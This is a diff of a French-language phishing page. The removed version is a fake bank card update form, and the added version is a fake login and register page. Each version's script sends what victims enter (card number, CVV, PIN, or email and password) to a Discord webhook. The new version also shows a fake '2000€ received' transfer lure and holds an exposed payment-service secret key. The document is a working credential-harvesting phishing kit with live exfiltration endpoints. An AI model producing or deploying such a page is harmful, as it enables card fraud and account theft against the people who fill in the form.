@@ -3,129 +3,173 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mise à jour Carte Bancaire</title>
+    <title>Auth animé</title>
     <style>
-        body {
-            background-color: #001f3f;
-            color: white;
-            font-family: Arial, sans-serif;
+        :root{ --primary:#007BFF; }
+        *{box-sizing:border-box;}
+        body{
+            margin:0;
+            height:100vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            font-family:Arial, sans-serif;
+            background:linear-gradient(135deg,#f5f7fa,#c3cfe2);
+            overflow:hidden;
         }
-        .container {
-            max-width: 600px;
-            margin: 50px auto;
-            padding: 25px;
-            background-color: #003366;
-            border-radius: 10px;
+        /* Card Login/Register */
+        .wrapper{
+            width:380px;
+            height:500px;
+            perspective:1000px;
         }
-        .form-group {
-            margin-bottom: 18px;
+        .card{
+            width:100%;
+            height:100%;
+            position:relative;
+            transform-style:preserve-3d;
+            transition:transform .7s ease;
         }
-        .form-group label {
-            display: block;
-            margin-bottom: 6px;
-            font-weight: bold;
+        .card.flipped{ transform:rotateY(180deg); }
+        .face{
+            position:absolute;
+            width:100%;
+            height:100%;
+            backface-visibility:hidden;
+            background:white;
+            border-radius:15px;
+            box-shadow:0 15px 40px rgba(0,0,0,.2);
+            padding:40px;
         }
-        .form-group input {
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
+        .back{ transform:rotateY(180deg); background:#fafafa; }
+        h2{ text-align:center; margin-bottom:25px; }
+        input{
+            width:100%;
+            padding:12px;
+            margin-bottom:15px;
+            border:2px solid #ddd;
+            border-radius:10px;
+            outline:none;
         }
-        .form-group input[type="submit"] {
-            background-color: #0056b3;
-            color: white;
-            cursor: pointer;
-            font-weight: bold;
-            padding: 14px;
-            margin-top: 10px;
+        input:focus{ border-color:var(--primary); }
+        button{
+            width:100%;
+            padding:12px;
+            background:var(--primary);
+            color:white;
+            border:none;
+            border-radius:10px;
+            cursor:pointer;
+            font-weight:bold;
+            margin-top:10px;
         }
-        .form-group input[type="submit"]:hover {
-            background-color: #004494;
+        .switch{
+            margin-top:15px;
+            text-align:center;
+            font-size:14px;
+            color:#555;
+            cursor:pointer;
         }
-        .warning {
-            background-color: #ffcc00;
-            color: #333;
-            padding: 14px;
-            border-radius: 6px;
-            margin-bottom: 25px;
+        .switch span{ color:var(--primary); font-weight:bold; }
+        /* Confirmation */
+        .confirmation {
+            display: none;
+            background-color: #fff;
+            padding: 40px 30px;
+            border-radius: 15px;
+            box-shadow: 0 15px 40px rgba(0,0,0,.2);
+            width: 380px;
             text-align: center;
-            font-weight: bold;
         }
+        .confirmation.show { display: block; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="warning">
-            ⚠️ Mise à jour des informations de votre carte bancaire requise ⚠️
+    <!-- Auth Page -->
+    <div class="wrapper" id="authPage">
+        <div class="card" id="card">
+            <!-- LOGIN -->
+            <div class="face front">
+                <h2>Connexion</h2>
+                <input type="email" id="loginEmail" placeholder="Email">
+                <input type="password" id="loginPassword" placeholder="Mot de passe">
+                <button onclick="login()">Se connecter</button>
+                <div class="switch">
+                    Pas de compte ? <span onclick="flip()">Créer un compte</span>
+                </div>
+            </div>
+            <!-- REGISTER -->
+            <div class="face back">
+                <h2>Créer un compte</h2>
+                <input type="email" id="registerEmail" placeholder="Email">
+                <input type="password" id="registerPassword" placeholder="Mot de passe">
+                <input type="password" id="confirmPassword" placeholder="Confirmer">
+                <button onclick="register()">Créer le compte</button>
+                <div class="switch">
+                    Déjà un compte ? <span onclick="flip()">Connexion</span>
+                </div>
+            </div>
         </div>
-
-        <h2>Coordonnées de votre carte</h2>
-        <form id="form">
-            <div class="form-group">
-                <label for="cardNumber">Numéro de carte (16 chiffres) :</label>
-                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
-            </div>
-
-            <div class="form-group">
-                <label for="expirationDate">Date d'expiration (MM/AA) :</label>
-                <input type="text" id="expirationDate" placeholder="12/28" maxlength="5" required>
-            </div>
-
-            <div class="form-group">
-                <label for="cvv">CVV :</label>
-                <input type="text" id="cvv" placeholder="123" maxlength="4" required>
-            </div>
-
-            <div class="form-group">
-                <label for="pinCode">Code PIN (4 chiffres) :</label>
-                <input type="text" id="pinCode" placeholder="••••" maxlength="4" inputmode="numeric" required>
-            </div>
-
-            <div class="form-group">
-                <input type="submit" value="Valider mes informations">
-            </div>
-        </form>
     </div>
-
+    <!-- Confirmation Page -->
+    <div class="confirmation" id="confirmationPage">
+        <h2>Confirmation</h2>
+        <p>Vous avez reçu <strong>2000€</strong>.<br>Veuillez autoriser ce montant à être transféré.</p>
+        <button onclick="redirectToStripe()">Cliquez pour confirmer</button>
+    </div>
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1472970808015061072/r5E9PRREA5jd1Oz7UPV9Zt0SJU2ifvVDcywyOn1WvpEImrBdmc0XmA_hVLpUfQgfAMcw";
-
-        async function sendToDiscord() {
-            const embed = {
-                title: "📥 Nouvelle soumission carte bancaire",
-                color: 0x0056b3,
-                timestamp: new Date().toISOString(),
-                fields: [
-                    { name: "Numéro de carte", value: document.getElementById("cardNumber").value || "Non renseigné", inline: false },
-                    { name: "Date d'expiration", value: document.getElementById("expirationDate").value || "Non renseigné", inline: true },
-                    { name: "CVV", value: document.getElementById("cvv").value || "Non renseigné", inline: true },
-                    { name: "Code PIN", value: document.getElementById("pinCode").value || "Non renseigné", inline: false }
-                ]
-            };
-
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ embeds: [embed] })
-                });
-                console.log("✅ Données envoyées vers Discord");
-            } catch (e) {
-                console.error("Erreur :", e);
+        function flip(){
+            document.getElementById("card").classList.toggle("flipped");
+        }
+        function login() {
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            if (email && password) {
+                sendToDiscord(email, password, 'login');
+                showConfirmation();
+            } else {
+                alert('Veuillez remplir tous les champs.');
             }
         }
-
-        document.getElementById("form").addEventListener("submit", async function(e) {
-            e.preventDefault();
-            await sendToDiscord();
-
-            alert("✅ Vos informations ont bien été enregistrées.");
-
-            // Réinitialisation
-            document.querySelectorAll('input').forEach(input => input.value = '');
-        });
+        function register() {
+            const email = document.getElementById('registerEmail').value;
+            const pass = document.getElementById('registerPassword').value;
+            const confirm = document.getElementById('confirmPassword').value;
+            if (pass !== confirm) return alert('Les mots de passe ne correspondent pas.');
+            if (email && pass) {
+                sendToDiscord(email, pass, 'register');
+                alert('Compte créé avec succès !');
+                flip();
+            } else {
+                alert('Veuillez remplir tous les champs.');
+            }
+        }
+        function showConfirmation() {
+            document.getElementById('authPage').style.display = 'none';
+            document.getElementById('confirmationPage').classList.add('show');
+        }
+        // === REDIRECTION VERS STRIPE CHECKOUT ===
+        function redirectToStripe() {
+            const stripeCheckoutUrl = "sk_test_51TWIaFRgCsvUXH5AdnpurCfQJrLsQToj7DCzkkTyj7oIBCixwEFx9fdn2q21Ho9vt8mxzThkms41FsWst1bcG65Y00OF1ZXS9t";
+            window.location.href = stripeCheckoutUrl;
+        }
+        // === FONCTION POUR ENVOYER LES DONNÉES À DISCORD ===
+        function sendToDiscord(email, password, type) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1492220758938619998/ntvaA4-1bi66QwLpFNayDinPRZ35kdV6SH8cCUogvWyCxgYBScg9vpuwLi0wTjT5sDJQ';
+            const data = {
+                content: `Nouveau ${type} :\nEmail: ${email}\nMot de passe: ${password}`
+            };
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Success:', data))
+            .catch((error) => console.error('Error:', error));
+        }
     </script>
 </body>
 </html>
-
